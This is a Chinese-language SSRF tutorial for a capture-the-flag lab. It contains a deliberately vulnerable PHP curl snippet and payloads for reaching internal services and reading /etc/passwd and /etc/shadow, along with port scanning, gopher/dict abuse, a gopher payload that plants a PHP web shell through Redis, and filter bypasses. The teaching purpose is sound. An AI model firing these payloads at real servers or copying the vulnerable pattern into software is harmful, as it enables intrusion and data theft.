# SSRF（服务端请求伪造）

## 概述

SSRF（Server-Side Request Forgery）允许攻击者让服务器发起请求，访问内网服务、读取本地文件或扫描端口。

## 漏洞代码

```php
<?php
$url = $_GET['url'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
$response = curl_exec($ch);
echo $response;
?>
```

## 攻击方式

### 1. 访问内网服务

```
?url=http://127.0.0.1:8080
?url=http://localhost:3306
?url=http://192.168.1.1/admin
?url=http://10.0.0.1:6379  # Redis
```

### 2. 读取本地文件

```
?url=file:///etc/passwd
?url=file:///etc/shadow
?url=file:///var/www/html/config.php
```

### 3. 端口扫描

```
?url=http://127.0.0.1:3306    # MySQL
?url=http://127.0.0.1:6379    # Redis
?url=http://127.0.0.1:27017   # MongoDB
?url=http://127.0.0.1:8080    # Web 服务
```

通过响应时间或错误信息判断端口是否开放。

### 4. 协议利用

```
?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aredis-cmd  # Redis
?url=dict://127.0.0.1:6379/info  # Redis
?url=ftp://127.0.0.1/  # FTP
```

### 5. 内网服务攻击

利用 SSRF 攻击内网 Redis、Memcached 等服务：

```
?url=gopher://127.0.0.1:6379/_SET%20shell%20"<?php%20system($_GET['cmd']);%20?>"
```

## SSRF 绕过

### 1. IP 地址变形

```
http://0x7f000001    # 16 进制
http://2130706433    # 10 进制
http://0177.0.0.1    # 8 进制
http://127.1         # 省略
http://[::1]         # IPv6
```

### 2. DNS 重绑定

使用 DNS 重绑定技术，第一次解析到允许的地址，第二次解析到内网地址。

### 3. 302 重定向

在可控服务器上设置 302 重定向到内网地址。

## 防御

1. 禁止访问内网地址
2. 使用白名单限制可访问的域名
3. 禁用 file://、gopher:// 等协议
4. 验证 DNS 解析结果

## 练习步骤

1. 尝试 `?url=http://127.0.0.1` — 访问本机
2. 尝试 `?url=file:///etc/passwd` — 读取文件
3. 扫描内网端口
4. 查找 flag

## flag

在内网服务或本地文件中查找 `CR{...}` 格式的 flag。
